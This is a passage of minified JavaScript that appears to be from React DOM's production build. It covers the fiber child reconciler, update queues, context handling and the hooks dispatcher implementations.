                  t);
        }
        if (typeof e != "string") throw Error(R(284));
        if (!n._owner) throw Error(R(290, e));
    }
    return e;
}
function Qs(e, t) {
    throw (
        ((e = Object.prototype.toString.call(t)),
        Error(R(31, e === "[object Object]" ? "object with keys {" + Object.keys(t).join(", ") + "}" : e)))
    );
}
function zd(e) {
    var t = e._init;
    return t(e._payload);
}
function Nm(e) {
    function t(g, h) {
        if (e) {
            var y = g.deletions;
            y === null ? ((g.deletions = [h]), (g.flags |= 16)) : y.push(h);
        }
    }
    function n(g, h) {
        if (!e) return null;
        for (; h !== null; ) t(g, h), (h = h.sibling);
        return null;
    }
    function r(g, h) {
        for (g = new Map(); h !== null; ) h.key !== null ? g.set(h.key, h) : g.set(h.index, h), (h = h.sibling);
        return g;
    }
    function o(g, h) {
        return (g = On(g, h)), (g.index = 0), (g.sibling = null), g;
    }
    function s(g, h, y) {
        return (
            (g.index = y),
            e
                ? ((y = g.alternate),
                  y !== null ? ((y = y.index), y < h ? ((g.flags |= 2), h) : y) : ((g.flags |= 2), h))
                : ((g.flags |= 1048576), h)
        );
    }
    function i(g) {
        return e && g.alternate === null && (g.flags |= 2), g;
    }
    function a(g, h, y, b) {
        return h === null || h.tag !== 6
            ? ((h = rl(y, g.mode, b)), (h.return = g), h)
            : ((h = o(h, y)), (h.return = g), h);
    }
    function l(g, h, y, b) {
        var k = y.type;
        return k === Rr
            ? d(g, h, y.props.children, b, y.key)
            : h !== null &&
                (h.elementType === k || (typeof k == "object" && k !== null && k.$$typeof === gn && zd(k) === h.type))
              ? ((b = o(h, y.props)), (b.ref = Ao(g, h, y)), (b.return = g), b)
              : ((b = yi(y.type, y.key, y.props, null, g.mode, b)), (b.ref = Ao(g, h, y)), (b.return = g), b);
    }
    function u(g, h, y, b) {
        return h === null ||
            h.tag !== 4 ||
            h.stateNode.containerInfo !== y.containerInfo ||
            h.stateNode.implementation !== y.implementation
            ? ((h = ol(y, g.mode, b)), (h.return = g), h)
            : ((h = o(h, y.children || [])), (h.return = g), h);
    }
    function d(g, h, y, b, k) {
        return h === null || h.tag !== 7
            ? ((h = ar(y, g.mode, b, k)), (h.return = g), h)
            : ((h = o(h, y)), (h.return = g), h);
    }
    function p(g, h, y) {
        if ((typeof h == "string" && h !== "") || typeof h == "number")
            return (h = rl("" + h, g.mode, y)), (h.return = g), h;
        if (typeof h == "object" && h !== null) {
            switch (h.$$typeof) {
                case Is:
                    return (
                        (y = yi(h.type, h.key, h.props, null, g.mode, y)), (y.ref = Ao(g, null, h)), (y.return = g), y
                    );
                case jr:
                    return (h = ol(h, g.mode, y)), (h.return = g), h;
                case gn:
                    var b = h._init;
                    return p(g, b(h._payload), y);
            }
            if (zo(h) || No(h)) return (h = ar(h, g.mode, y, null)), (h.return = g), h;
            Qs(g, h);
        }
        return null;
    }
    function m(g, h, y, b) {
        var k = h !== null ? h.key : null;
        if ((typeof y == "string" && y !== "") || typeof y == "number") return k !== null ? null : a(g, h, "" + y, b);
        if (typeof y == "object" && y !== null) {
            switch (y.$$typeof) {
                case Is:
                    return y.key === k ? l(g, h, y, b) : null;
                case jr:
                    return y.key === k ? u(g, h, y, b) : null;
                case gn:
                    return (k = y._init), m(g, h, k(y._payload), b);
            }
            if (zo(y) || No(y)) return k !== null ? null : d(g, h, y, b, null);
            Qs(g, y);
        }
        return null;
    }
    function f(g, h, y, b, k) {
        if ((typeof b == "string" && b !== "") || typeof b == "number")
            return (g = g.get(y) || null), a(h, g, "" + b, k);
        if (typeof b == "object" && b !== null) {
            switch (b.$$typeof) {
                case Is:
                    return (g = g.get(b.key === null ? y : b.key) || null), l(h, g, b, k);
                case jr:
                    return (g = g.get(b.key === null ? y : b.key) || null), u(h, g, b, k);
                case gn:
                    var C = b._init;
                    return f(g, h, y, C(b._payload), k);
            }
            if (zo(b) || No(b)) return (g = g.get(y) || null), d(h, g, b, k, null);
            Qs(h, b);
        }
        return null;
    }
    function S(g, h, y, b) {
        for (var k = null, C = null, E = h, j = (h = 0), _ = null; E !== null && j < y.length; j++) {
            E.index > j ? ((_ = E), (E = null)) : (_ = E.sibling);
            var M = m(g, E, y[j], b);
            if (M === null) {
                E === null && (E = _);
                break;
            }
            e && E && M.alternate === null && t(g, E),
                (h = s(M, h, j)),
                C === null ? (k = M) : (C.sibling = M),
                (C = M),
                (E = _);
        }
        if (j === y.length) return n(g, E), ce && qn(g, j), k;
        if (E === null) {
            for (; j < y.length; j++)
                (E = p(g, y[j], b)), E !== null && ((h = s(E, h, j)), C === null ? (k = E) : (C.sibling = E), (C = E));
            return ce && qn(g, j), k;
        }
        for (E = r(g, E); j < y.length; j++)
            (_ = f(E, g, j, y[j], b)),
                _ !== null &&
                    (e && _.alternate !== null && E.delete(_.key === null ? j : _.key),
                    (h = s(_, h, j)),
                    C === null ? (k = _) : (C.sibling = _),
                    (C = _));
        return (
            e &&
                E.forEach(function (H) {
                    return t(g, H);
                }),
            ce && qn(g, j),
            k
        );
    }
    function v(g, h, y, b) {
        var k = No(y);
        if (typeof k != "function") throw Error(R(150));
        if (((y = k.call(y)), y == null)) throw Error(R(151));
        for (var C = (k = null), E = h, j = (h = 0), _ = null, M = y.next(); E !== null && !M.done; j++, M = y.next()) {
            E.index > j ? ((_ = E), (E = null)) : (_ = E.sibling);
            var H = m(g, E, M.value, b);
            if (H === null) {
                E === null && (E = _);
                break;
            }
            e && E && H.alternate === null && t(g, E),
                (h = s(H, h, j)),
                C === null ? (k = H) : (C.sibling = H),
                (C = H),
                (E = _);
        }
        if (M.done) return n(g, E), ce && qn(g, j), k;
        if (E === null) {
            for (; !M.done; j++, M = y.next())
                (M = p(g, M.value, b)),
                    M !== null && ((h = s(M, h, j)), C === null ? (k = M) : (C.sibling = M), (C = M));
            return ce && qn(g, j), k;
        }
        for (E = r(g, E); !M.done; j++, M = y.next())
            (M = f(E, g, j, M.value, b)),
                M !== null &&
                    (e && M.alternate !== null && E.delete(M.key === null ? j : M.key),
                    (h = s(M, h, j)),
                    C === null ? (k = M) : (C.sibling = M),
                    (C = M));
        return (
            e &&
                E.forEach(function (D) {
                    return t(g, D);
                }),
            ce && qn(g, j),
            k
        );
    }
    function w(g, h, y, b) {
        if (
            (typeof y == "object" && y !== null && y.type === Rr && y.key === null && (y = y.props.children),
            typeof y == "object" && y !== null)
        ) {
            switch (y.$$typeof) {
                case Is:
                    e: {
                        for (var k = y.key, C = h; C !== null; ) {
                            if (C.key === k) {
                                if (((k = y.type), k === Rr)) {
                                    if (C.tag === 7) {
                                        n(g, C.sibling), (h = o(C, y.props.children)), (h.return = g), (g = h);
                                        break e;
                                    }
                                } else if (
                                    C.elementType === k ||
                                    (typeof k == "object" && k !== null && k.$$typeof === gn && zd(k) === C.type)
                                ) {
                                    n(g, C.sibling),
                                        (h = o(C, y.props)),
                                        (h.ref = Ao(g, C, y)),
                                        (h.return = g),
                                        (g = h);
                                    break e;
                                }
                                n(g, C);
                                break;
                            } else t(g, C);
                            C = C.sibling;
                        }
                        y.type === Rr
                            ? ((h = ar(y.props.children, g.mode, b, y.key)), (h.return = g), (g = h))
                            : ((b = yi(y.type, y.key, y.props, null, g.mode, b)),
                              (b.ref = Ao(g, h, y)),
                              (b.return = g),
                              (g = b));
                    }
                    return i(g);
                case jr:
                    e: {
                        for (C = y.key; h !== null; ) {
                            if (h.key === C)
                                if (
                                    h.tag === 4 &&
                                    h.stateNode.containerInfo === y.containerInfo &&
                                    h.stateNode.implementation === y.implementation
                                ) {
                                    n(g, h.sibling), (h = o(h, y.children || [])), (h.return = g), (g = h);
                                    break e;
                                } else {
                                    n(g, h);
                                    break;
                                }
                            else t(g, h);
                            h = h.sibling;
                        }
                        (h = ol(y, g.mode, b)), (h.return = g), (g = h);
                    }
                    return i(g);
                case gn:
                    return (C = y._init), w(g, h, C(y._payload), b);
            }
            if (zo(y)) return S(g, h, y, b);
            if (No(y)) return v(g, h, y, b);
            Qs(g, y);
        }
        return (typeof y == "string" && y !== "") || typeof y == "number"
            ? ((y = "" + y),
              h !== null && h.tag === 6
                  ? (n(g, h.sibling), (h = o(h, y)), (h.return = g), (g = h))
                  : (n(g, h), (h = rl(y, g.mode, b)), (h.return = g), (g = h)),
              i(g))
            : n(g, h);
    }
    return w;
}
var lo = Nm(!0),
    Pm = Nm(!1),
    Li = Vn(null),
    Oi = null,
    zr = null,
    tu = null;
function nu() {
    tu = zr = Oi = null;
}
function ru(e) {
    var t = Li.current;
    ae(Li), (e._currentValue = t);
}
function Gl(e, t, n) {
    for (; e !== null; ) {
        var r = e.alternate;
        if (
            ((e.childLanes & t) !== t
                ? ((e.childLanes |= t), r !== null && (r.childLanes |= t))
                : r !== null && (r.childLanes & t) !== t && (r.childLanes |= t),
            e === n)
        )
            break;
        e = e.return;
    }
}
function Kr(e, t) {
    (Oi = e),
        (tu = zr = null),
        (e = e.dependencies),
        e !== null && e.firstContext !== null && (e.lanes & t && (He = !0), (e.firstContext = null));
}
function at(e) {
    var t = e._currentValue;
    if (tu !== e)
        if (((e = { context: e, memoizedValue: t, next: null }), zr === null)) {
            if (Oi === null) throw Error(R(308));
            (zr = e), (Oi.dependencies = { lanes: 0, firstContext: e });
        } else zr = zr.next = e;
    return t;
}
var Zn = null;
function ou(e) {
    Zn === null ? (Zn = [e]) : Zn.push(e);
}
function Tm(e, t, n, r) {
    var o = t.interleaved;
    return o === null ? ((n.next = n), ou(t)) : ((n.next = o.next), (o.next = n)), (t.interleaved = n), tn(e, r);
}
function tn(e, t) {
    e.lanes |= t;
    var n = e.alternate;
    for (n !== null && (n.lanes |= t), n = e, e = e.return; e !== null; )
        (e.childLanes |= t), (n = e.alternate), n !== null && (n.childLanes |= t), (n = e), (e = e.return);
    return n.tag === 3 ? n.stateNode : null;
}
var yn = !1;
function su(e) {
    e.updateQueue = {
        baseState: e.memoizedState,
        firstBaseUpdate: null,
        lastBaseUpdate: null,
        shared: { pending: null, interleaved: null, lanes: 0 },
        effects: null,
    };
}
function jm(e, t) {
    (e = e.updateQueue),
        t.updateQueue === e &&
            (t.updateQueue = {
                baseState: e.baseState,
                firstBaseUpdate: e.firstBaseUpdate,
                lastBaseUpdate: e.lastBaseUpdate,
                shared: e.shared,
                effects: e.effects,
            });
}
function Yt(e, t) {
    return { eventTime: e, lane: t, tag: 0, payload: null, callback: null, next: null };
}
function Mn(e, t, n) {
    var r = e.updateQueue;
    if (r === null) return null;
    if (((r = r.shared), J & 2)) {
        var o = r.pending;
        return o === null ? (t.next = t) : ((t.next = o.next), (o.next = t)), (r.pending = t), tn(e, n);
    }
    return (
        (o = r.interleaved),
        o === null ? ((t.next = t), ou(r)) : ((t.next = o.next), (o.next = t)),
        (r.interleaved = t),
        tn(e, n)
    );
}
function di(e, t, n) {
    if (((t = t.updateQueue), t !== null && ((t = t.shared), (n & 4194240) !== 0))) {
        var r = t.lanes;
        (r &= e.pendingLanes), (n |= r), (t.lanes = n), Vc(e, n);
    }
}
function Fd(e, t) {
    var n = e.updateQueue,
        r = e.alternate;
    if (r !== null && ((r = r.updateQueue), n === r)) {
        var o = null,
            s = null;
        if (((n = n.firstBaseUpdate), n !== null)) {
            do {
                var i = {
                    eventTime: n.eventTime,
                    lane: n.lane,
                    tag: n.tag,
                    payload: n.payload,
                    callback: n.callback,
                    next: null,
                };
                s === null ? (o = s = i) : (s = s.next = i), (n = n.next);
            } while (n !== null);
            s === null ? (o = s = t) : (s = s.next = t);
        } else o = s = t;
        (n = { baseState: r.baseState, firstBaseUpdate: o, lastBaseUpdate: s, shared: r.shared, effects: r.effects }),
            (e.updateQueue = n);
        return;
    }
    (e = n.lastBaseUpdate), e === null ? (n.firstBaseUpdate = t) : (e.next = t), (n.lastBaseUpdate = t);
}
function Ii(e, t, n, r) {
    var o = e.updateQueue;
    yn = !1;
    var s = o.firstBaseUpdate,
        i = o.lastBaseUpdate,
        a = o.shared.pending;
    if (a !== null) {
        o.shared.pending = null;
        var l = a,
            u = l.next;
        (l.next = null), i === null ? (s = u) : (i.next = u), (i = l);
        var d = e.alternate;
        d !== null &&
            ((d = d.updateQueue),
            (a = d.lastBaseUpdate),
            a !== i && (a === null ? (d.firstBaseUpdate = u) : (a.next = u), (d.lastBaseUpdate = l)));
    }
    if (s !== null) {
        var p = o.baseState;
        (i = 0), (d = u = l = null), (a = s);
        do {
            var m = a.lane,
                f = a.eventTime;
            if ((r & m) === m) {
                d !== null &&
                    (d = d.next =
                        { eventTime: f, lane: 0, tag: a.tag, payload: a.payload, callback: a.callback, next: null });
                e: {
                    var S = e,
                        v = a;
                    switch (((m = t), (f = n), v.tag)) {
                        case 1:
                            if (((S = v.payload), typeof S == "function")) {
                                p = S.call(f, p, m);
                                break e;
                            }
                            p = S;
                            break e;
                        case 3:
                            S.flags = (S.flags & -65537) | 128;
                        case 0:
                            if (((S = v.payload), (m = typeof S == "function" ? S.call(f, p, m) : S), m == null))
                                break e;
                            p = pe({}, p, m);
                            break e;
                        case 2:
                            yn = !0;
                    }
                }
                a.callback !== null &&
                    a.lane !== 0 &&
                    ((e.flags |= 64), (m = o.effects), m === null ? (o.effects = [a]) : m.push(a));
            } else
                (f = { eventTime: f, lane: m, tag: a.tag, payload: a.payload, callback: a.callback, next: null }),
                    d === null ? ((u = d = f), (l = p)) : (d = d.next = f),
                    (i |= m);
            if (((a = a.next), a === null)) {
                if (((a = o.shared.pending), a === null)) break;
                (m = a), (a = m.next), (m.next = null), (o.lastBaseUpdate = m), (o.shared.pending = null);
            }
        } while (!0);
        if (
            (d === null && (l = p),
            (o.baseState = l),
            (o.firstBaseUpdate = u),
            (o.lastBaseUpdate = d),
            (t = o.shared.interleaved),
            t !== null)
        ) {
            o = t;
            do (i |= o.lane), (o = o.next);
            while (o !== t);
        } else s === null && (o.shared.lanes = 0);
        (dr |= i), (e.lanes = i), (e.memoizedState = p);
    }
}
function Ud(e, t, n) {
    if (((e = t.effects), (t.effects = null), e !== null))
        for (t = 0; t < e.length; t++) {
            var r = e[t],
                o = r.callback;
            if (o !== null) {
                if (((r.callback = null), (r = n), typeof o != "function")) throw Error(R(191, o));
                o.call(r);
            }
        }
}
var Ps = {},
    zt = Vn(Ps),
    cs = Vn(Ps),
    us = Vn(Ps);
function Jn(e) {
    if (e === Ps) throw Error(R(174));
    return e;
}
function iu(e, t) {
    switch ((oe(us, t), oe(cs, e), oe(zt, Ps), (e = t.nodeType), e)) {
        case 9:
        case 11:
            t = (t = t.documentElement) ? t.namespaceURI : Tl(null, "");
            break;
        default:
            (e = e === 8 ? t.parentNode : t), (t = e.namespaceURI || null), (e = e.tagName), (t = Tl(t, e));
    }
    ae(zt), oe(zt, t);
}
function co() {
    ae(zt), ae(cs), ae(us);
}
function Rm(e) {
    Jn(us.current);
    var t = Jn(zt.current),
        n = Tl(t, e.type);
    t !== n && (oe(cs, e), oe(zt, n));
}
function au(e) {
    cs.current === e && (ae(zt), ae(cs));
}
var ue = Vn(0);
function Di(e) {
    for (var t = e; t !== null; ) {
        if (t.tag === 13) {
            var n = t.memoizedState;
            if (n !== null && ((n = n.dehydrated), n === null || n.data === "$?" || n.data === "$!")) return t;
        } else if (t.tag === 19 && t.memoizedProps.revealOrder !== void 0) {
            if (t.flags & 128) return t;
        } else if (t.child !== null) {
            (t.child.return = t), (t = t.child);
            continue;
        }
        if (t === e) break;
        for (; t.sibling === null; ) {
            if (t.return === null || t.return === e) return null;
            t = t.return;
        }
        (t.sibling.return = t.return), (t = t.sibling);
    }
    return null;
}
var Ya = [];
function lu() {
    for (var e = 0; e < Ya.length; e++) Ya[e]._workInProgressVersionPrimary = null;
    Ya.length = 0;
}
var pi = sn.ReactCurrentDispatcher,
    Za = sn.ReactCurrentBatchConfig,
    ur = 0,
    de = null,
    we = null,
    ke = null,
    zi = !1,
    Ko = !1,
    ds = 0,
    g1 = 0;
function je() {
    throw Error(R(321));
}
function cu(e, t) {
    if (t === null) return !1;
    for (var n = 0; n < t.length && n < e.length; n++) if (!Et(e[n], t[n])) return !1;
    return !0;
}
function uu(e, t, n, r, o, s) {
    if (
        ((ur = s),
        (de = t),
        (t.memoizedState = null),
        (t.updateQueue = null),
        (t.lanes = 0),
        (pi.current = e === null || e.memoizedState === null ? w1 : S1),
        (e = n(r, o)),
        Ko)
    ) {
        s = 0;
        do {
            if (((Ko = !1), (ds = 0), 25 <= s)) throw Error(R(301));
            (s += 1), (ke = we = null), (t.updateQueue = null), (pi.current = b1), (e = n(r, o));
        } while (Ko);
    }
    if (((pi.current = Fi), (t = we !== null && we.next !== null), (ur = 0), (ke = we = de = null), (zi = !1), t))
        throw Error(R(300));
    return e;
}
function du() {
    var e = ds !== 0;
    return (ds = 0), e;
}
function At() {
    var e = { memoizedState: null, baseState: null, baseQueue: null, queue: null, next: null };
    return ke === null ? (de.memoizedState = ke = e) : (ke = ke.next = e), ke;
}
function lt() {
    if (we === null) {
        var e = de.alternate;
        e = e !== null ? e.memoizedState : null;
    } else e = we.next;
    var t = ke === null ? de.memoizedState : ke.next;
    if (t !== null) (ke = t), (we = e);
    else {
        if (e === null) throw Error(R(310));
        (we = e),
            (e = {
                memoizedState: we.memoizedState,
                baseState: we.baseState,
                baseQueue: we.baseQueue,
                queue: we.queue,
                next: null,
            }),
            ke === null ? (de.memoizedState = ke = e) : (ke = ke.next = e);
    }
    return ke;
}
function ps(e, t) {
    return typeof t == "function" ? t(e) : t;
}
function Ja(e) {
    var t = lt(),
        n = t.queue;
    if (n === null) throw Error(R(311));
    n.lastRenderedReducer = e;
    var r = we,
        o = r.baseQueue,
        s = n.pending;
    if (s !== null) {
        if (o !== null) {
            var i = o.next;
            (o.next = s.next), (s.next = i);
        }
        (r.baseQueue = o = s), (n.pending = null);
    }
    if (o !== null) {
        (s = o.next), (r = r.baseState);
        var a = (i = null),
            l = null,
            u = s;
        do {
            var d = u.lane;
            if ((ur & d) === d)
                l !== null &&
                    (l = l.next =
                        {
                            lane: 0,
                            action: u.action,
                            hasEagerState: u.hasEagerState,
                            eagerState: u.eagerState,
                            next: null,
                        }),
                    (r = u.hasEagerState ? u.eagerState : e(r, u.action));
            else {
                var p = {
                    lane: d,
                    action: u.action,
                    hasEagerState: u.hasEagerState,
                    eagerState: u.eagerState,
                    next: null,
                };
                l === null ? ((a = l = p), (i = r)) : (l = l.next = p), (de.lanes |= d), (dr |= d);
            }
            u = u.next;
        } while (u !== null && u !== s);
        l === null ? (i = r) : (l.next = a),
            Et(r, t.memoizedState) || (He = !0),
            (t.memoizedState = r),
            (t.baseState = i),
            (t.baseQueue = l),
            (n.lastRenderedState = r);
    }
    if (((e = n.interleaved), e !== null)) {
        o = e;
        do (s = o.lane), (de.lanes |= s), (dr |= s), (o = o.next);
        while (o !== e);
    } else o === null && (n.lanes = 0);
    return [t.memoizedState, n.dispatch];
}
function el(e) {
    var t = lt(),
        n = t.queue;
    if (n === null) throw Error(R(311));
    n.lastRenderedReducer = e;
    var r = n.dispatch,
        o = n.pending,
        s = t.memoizedState;
    if (o !== null) {
        n.pending = null;
        var i = (o = o.next);
        do (s = e(s, i.action)), (i = i.next);
        while (i !== o);
        Et(s, t.memoizedState) || (He = !0),
            (t.memoizedState = s),
            t.baseQueue === null && (t.baseState = s),
            (n.lastRenderedState = s);
    }
    return [s, r];
}
function Am() {}
function Mm(e, t) {
    var n = de,
        r = lt(),
        o = t(),
        s = !Et(r.memoizedState, o);
    if (
        (s && ((r.memoizedState = o), (He = !0)),
        (r = r.queue),
        pu(Om.bind(null, n, r, e), [e]),
        r.getSnapshot !== t || s || (ke !== null && ke.memoizedState.tag & 1))
    ) {
        if (((n.flags |= 2048), fs(9, Lm.bind(null, n, r, o, t), void 0, null), Ce === null)) throw Error(R(349));
        ur & 30 || _m(n, t, o);
    }
    return o;
}
function _m(e, t, n) {
    (e.flags |= 16384),
        (e = { getSnapshot: t, value: n }),
        (t = de.updateQueue),
        t === null
            ? ((t = { lastEffect: null, stores: null }), (de.updateQueue = t), (t.stores = [e]))
            : ((n = t.stores), n === null ? (t.stores = [e]) : n.push(e));
}
function Lm(e, t, n, r) {
    (t.value = n), (t.getSnapshot = r), Im(t) && Dm(e);
}
function Om(e, t, n) {
    return n(function () {
        Im(t) && Dm(e);
    });
}
function Im(e) {
    var t = e.getSnapshot;
    e = e.value;
    try {
        var n = t();
        return !Et(e, n);
    } catch {
        return !0;
    }
}
function Dm(e) {
    var t = tn(e, 1);
    t !== null && Ct(t, e, 1, -1);
}
function $d(e) {
    var t = At();
    return (
        typeof e == "function" && (e = e()),
        (t.memoizedState = t.baseState = e),
        (e = {
            pending: null,
            interleaved: null,
            lanes: 0,
            dispatch: null,
            lastRenderedReducer: ps,
            lastRenderedState: e,
        }),
        (t.queue = e),
        (e = e.dispatch = x1.bind(null, de, e)),
        [t.memoizedState, e]
    );
}
function fs(e, t, n, r) {
    return (
        (e = { tag: e, create: t, destroy: n, deps: r, next: null }),
        (t = de.updateQueue),
        t === null
            ? ((t = { lastEffect: null, stores: null }), (de.updateQueue = t), (t.lastEffect = e.next = e))
            : ((n = t.lastEffect),
              n === null
                  ? (t.lastEffect = e.next = e)
                  : ((r = n.next), (n.next = e), (e.next = r), (t.lastEffect = e))),
        e
    );
}
function zm() {
    return lt().memoizedState;
}
function fi(e, t, n, r) {
    var o = At();
    (de.flags |= e), (o.memoizedState = fs(1 | t, n, void 0, r === void 0 ? null : r));
}
function ca(e, t, n, r) {
    var o = lt();
    r = r === void 0 ? null : r;
    var s = void 0;
    if (we !== null) {
        var i = we.memoizedState;
        if (((s = i.destroy), r !== null && cu(r, i.deps))) {
            o.memoizedState = fs(t, n, s, r);
            return;
        }
    }
    (de.flags |= e), (o.memoizedState = fs(1 | t, n, s, r));
}
function Hd(e, t) {
    return fi(8390656, 8, e, t);
}
function pu(e, t) {
    return ca(2048, 8, e, t);
}
function Fm(e, t) {
    return ca(4, 2, e, t);
}
function Um(e, t) {
    return ca(4, 4, e, t);
}
function $m(e, t) {
    if (typeof t == "function")
        return (
            (e = e()),
            t(e),
            function () {
                t(null);
            }
        );
    if (t != null)
        return (
            (e = e()),
            (t.current = e),
            function () {
                t.current = null;
            }
        );
}
function Hm(e, t, n) {
    return (n = n != null ? n.concat([e]) : null), ca(4, 4, $m.bind(null, t, e), n);
}
function fu() {}
function Bm(e, t) {
    var n = lt();
    t = t === void 0 ? null : t;
    var r = n.memoizedState;
    return r !== null && t !== null && cu(t, r[1]) ? r[0] : ((n.memoizedState = [e, t]), e);
}
function Vm(e, t) {
    var n = lt();
    t = t === void 0 ? null : t;
    var r = n.memoizedState;
    return r !== null && t !== null && cu(t, r[1]) ? r[0] : ((e = e()), (n.memoizedState = [e, t]), e);
}
function Wm(e, t, n) {
    return ur & 21
        ? (Et(n, t) || ((n = Xf()), (de.lanes |= n), (dr |= n), (e.baseState = !0)), t)
        : (e.baseState && ((e.baseState = !1), (He = !0)), (e.memoizedState = n));
}
function y1(e, t) {
    var n = te;
    (te = n !== 0 && 4 > n ? n : 4), e(!0);
    var r = Za.transition;
    Za.transition = {};
    try {
        e(!1), t();
    } finally {
        (te = n), (Za.transition = r);
    }
}
function Km() {
    return lt().memoizedState;
}
function v1(e, t, n) {
    var r = Ln(e);
    if (((n = { lane: r, action: n, hasEagerState: !1, eagerState: null, next: null }), Qm(e))) Gm(t, n);
    else if (((n = Tm(e, t, n, r)), n !== null)) {
        var o = De();
        Ct(n, e, r, o), qm(n, t, r);
    }
}
function x1(e, t, n) {
    var r = Ln(e),
        o = { lane: r, action: n, hasEagerState: !1, eagerState: null, next: null };
    if (Qm(e)) Gm(t, o);
    else {
        var s = e.alternate;
        if (e.lanes === 0 && (s === null || s.lanes === 0) && ((s = t.lastRenderedReducer), s !== null))
            try {
                var i = t.lastRenderedState,
                    a = s(i, n);
                if (((o.hasEagerState = !0), (o.eagerState = a), Et(a, i))) {
                    var l = t.interleaved;
                    l === null ? ((o.next = o), ou(t)) : ((o.next = l.next), (l.next = o)), (t.interleaved = o);
                    return;
                }
            } catch {
            } finally {
            }
        (n = Tm(e, t, o, r)), n !== null && ((o = De()), Ct(n, e, r, o), qm(n, t, r));
    }
}
function Qm(e) {
    var t = e.alternate;
    return e === de || (t !== null && t === de);
}
function Gm(e, t) {
    Ko = zi = !0;
    var n = e.pending;
    n === null ? (t.next = t) : ((t.next = n.next), (n.next = t)), (e.pending = t);
}
function qm(e, t, n) {
    if (n & 4194240) {
        var r = t.lanes;
        (r &= e.pendingLanes), (n |= r), (t.lanes = n), Vc(e, n);
    }
}
var Fi = {
        readContext: at,
        useCallback: je,
        useContext: je,
        useEffect: je,
        useImperativeHandle: je,
        useInsertionEffect: je,
        useLayoutEffect: je,
        useMemo: je,
        useReducer: je,
        useRef: je,
        useState: je,
        useDebugValue: je,
        useDeferredValue: je,
        useTransition: je,
        useMutableSource: je,
        useSyncExternalStore: je,
        useId: je,
        unstable_isNewReconciler: !1,
    },
    w1 = {
        readContext: at,
        useCallback: function (e, t) {
            return (At().memoizedState = [e, t === void 0 ? null : t]), e;
        },
        useContext: at,
        useEffect: Hd,
        useImperativeHandle: function (e, t, n) {
            return (n = n != null ? n.concat([e]) : null), fi(4194308, 4, $m.bind(null, t, e), n);
        },
        useLayoutEffect: function (e, t) {
            return fi(4194308, 4, e, t);
        },
        useInsertionEffect: function (e, t) {
            return fi(4, 2, e, t);
        },
        useMemo: function (e, t) {
            var n = At();
            return (t = t === void 0 ? null : t), (e = e()), (n.memoizedState = [e, t]), e;
        },
        useReducer: function (e, t, n) {
            var r = At();
            return (
                (t = n !== void 0 ? n(t) : t),
                (r.memoizedState = r.baseState = t),
                (e = {
                    pending: null,
                    interleaved: null,
                    lanes: 0,
                    dispatch: null,
                    lastRenderedReducer: e,
                    lastRenderedState: t,
                }),
                (r.queue = e),
                (e = e.dispatch = v1.bind(null, de, e)),
                [r.memoizedState, e]
            );
        },
        useRef: function (e) {
            var t = At();
            return (e = { current: e }), (t.memoizedState = e);
        },
        useState: $d,
        useDebugValue: fu,
        useDeferredValue: function (e) {
            return (At().memoizedState = e);
        },
        useTransition: function () {
            var e = $d(!1),
                t = e[0];
            return (e = y1.bind(null, e[1])), (At().memoizedState = e), [t, e];
        },
        useMutableSource: function () {},
        useSyncExternalStore: function (e, t, n) {
            var r = de,
                o = At();
            if (ce) {
                if (n === void 0) throw Error(R(407));
                n = n();
            } else {
                if (((n = t()), Ce === null)) throw Error(R(349));
                ur & 30 || _m(r, t, n);
            }
            o.memoizedState = n;
            var s = { value: n, getSnapshot: t };
            return (
                (o.queue = s),
                Hd(Om.bind(null, r, s, e), [e]),
                (r.flags |= 2048),
                fs(9, Lm.bind(null, r, s, n, t), void 0, null),
                n
            );
        },
        useId: function () {
            var e = At(),
                t = Ce.identifierPrefix;
            if (ce) {
                var n = Xt,
                    r = qt;
                (n = (r & ~(1 << (32 - kt(r) - 1))).toString(32) + n),
                    (t = ":" + t + "R" + n),
                    (n = ds++),
                    0 < n && (t += "H" + n.toString(32)),
                    (t += ":");
            } else (n = g1++), (t = ":" + t + "r" + n.toString(32) + ":");
            return (e.memoizedState = t);
        },
        unstable_isNewReconciler: !1,
    },
    S1 = {
        readContext: at,
        useCallback: Bm,
        useContext: at,
        useEffect: pu,
        useImperativeHandle: Hm,
        useInsertionEffect: Fm,
        useLayoutEffect: Um,
        useMemo: Vm,
        useReducer: Ja,
        useRef: zm,
        useState: function () {
            return Ja(ps);
        },
        useDebugValue: fu,
        useDeferredValue: function (e) {
            var t = lt();
            return Wm(t, we.memoizedState, e);
        },
        useTransition: function () {
            var e = Ja(ps)[0],
                t = lt().memoizedState;
            return [e, t];
        },
        useMutableSource: Am,
        useSyncExternalStore: Mm,
        useId: Km,
        unstable_isNewReconciler: !1,
    },
    b1 = {
        readContext: at,
        useCallback: Bm,
        useContext: at,
        useEffect: pu,
        useImperativeHandle: Hm,
        useInsertionEffect: Fm,
        useLayoutEffect: Um,
        useMemo: Vm,
        useReducer: el,
        useRef: zm,
        useState: function () {
            return el(ps);
        },
        useDebugValue: fu,
        useDeferredValue: function (e) {
            var t = lt();
            return we === null ? (t.memoizedState = e) : Wm(t, we.memoizedState, e);
        },
        useTransition: function () {
            var e = el(ps)[0],
                t = lt().memoizedState;
            return [e, t];
        },
        useMutableSource: Am,
        useSyncExternalStore: Mm,
        useId: Km,
        unstable_isNewReconciler: !1,
    };
function yt(e, t) {
    if (e && e.defaultProps) {
        (t = pe({}, t)), (e = e.defaultProps);
        for (var n in e) t[n] === void 0 && (t[n] = e[n]);
        return t;
    }
    return t;
}
function ql(e, t, n, r) {
    (t = e.memoizedState),
        (n = n(r, t)),
        (n = n == null ? t : pe({}, t, n)),
        (e.memoizedState = n),
        e.lanes === 0 && (e.updateQueue.baseState = n);
}
var ua = {
    isMounted: function (e) {
        return (e = e._reactInternals) ? gr(e) === e : !1;
    },
    enqueueSetState: function (e, t, n) {
        e = e._reactInternals;
        var r = De(),
            o = Ln(e),
            s = Yt(r, o);
        (s.payload = t), n != null && (s.callback = n), (t = Mn(e, s, o)), t !== null && (Ct(t, e, o, r), di(t, e, o));
    },
    enqueueReplaceState: function (e, t, n) {
        e = e._reactInternals;
        var r = De(),
            o = Ln(e),
            s = Yt(r, o);
        (s.tag = 1),
            (s.payload = t),
            n != null && (s.callback = n),
            (t = Mn(e, s, o)),
            t !== null && (Ct(t, e, o, r), di(t, e, o));
    },
    enqueueForceUpdate: function (e, t) {
        e = e._reactInternals;
        var n = De(),
            r = Ln(e),
            o = Yt(n, r);
        (o.tag = 2), t != null && (o.callback = t), (t = Mn(e, o, r)), t !== null && (Ct(t, e, r, n), di(t, e, r));
    },
};
function Bd(e, t, n, r, o, s, i) {
    return (
        (e = e.stateNode),
